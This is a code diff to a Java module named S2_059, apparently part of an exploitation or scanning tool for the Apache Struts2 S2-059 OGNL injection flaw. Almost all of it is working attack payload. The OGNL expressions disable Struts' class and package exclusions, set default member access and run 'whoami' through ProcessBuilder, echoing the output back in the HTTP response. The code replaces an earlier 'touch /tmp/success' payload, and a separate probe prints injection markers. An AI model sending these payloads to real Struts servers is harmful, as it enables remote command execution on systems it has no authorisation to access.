@@ -17,13 +17,14 @@ public class S2_059 extends IModule {
             ".(#ognlUtil.setExcludedClasses(''))" +
             ".(#ognlUtil.setExcludedPackageNames(''))" +
             ".(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))" +
-            ".(#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'))" +
-            ".(#res.getWriter().print('"+ injectMark[0] +"'))" +
-            ".(#res.getWriter().print('"+ injectMark[1] +"'))" +
-            ".(#res.getWriter().flush())" +
-            ".(#res.getWriter().close())}";
+            ".(#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter())" +
+            ".(#res.print('"+ injectMark[0] +"'))" +
+            ".(#res.print('"+ injectMark[1] +"'))" +
+            ".(#res.flush())" +
+            ".(#res.close())}";
         poc = URLEncoder.encode(poc);
 
+        //有待商榷，某些版本struts中不一定能使用构造函数
         exp =
             "%{" +
             "(#context=#attr['struts.valueStack'].context)" +
@@ -32,8 +33,16 @@ public class S2_059 extends IModule {
             ".(#ognlUtil.setExcludedClasses(''))" +
             ".(#ognlUtil.setExcludedPackageNames(''))" +
             ".(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))" +
-            ".(@java.lang.Runtime@getRuntime()" +
-            ".exec('touch /tmp/success'))" +
+            ".(#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter())" +
+            ".(#a=(new java.lang.ProcessBuilder('whoami')).start())" +
+            ".(#b=#a.getInputStream())" +
+            ".(#c=new java.io.InputStreamReader(#b))" +
+            ".(#d=new java.io.BufferedReader(#c))" +
+            ".(#e=new char[50])" +
+            ".(#d.read(#e))" +
+            ".(#res.print(#e))" +
+            ".(#res.flush())" +
+            ".(#res.close())" +
             "}";
         exp = URLEncoder.encode(exp);
     }
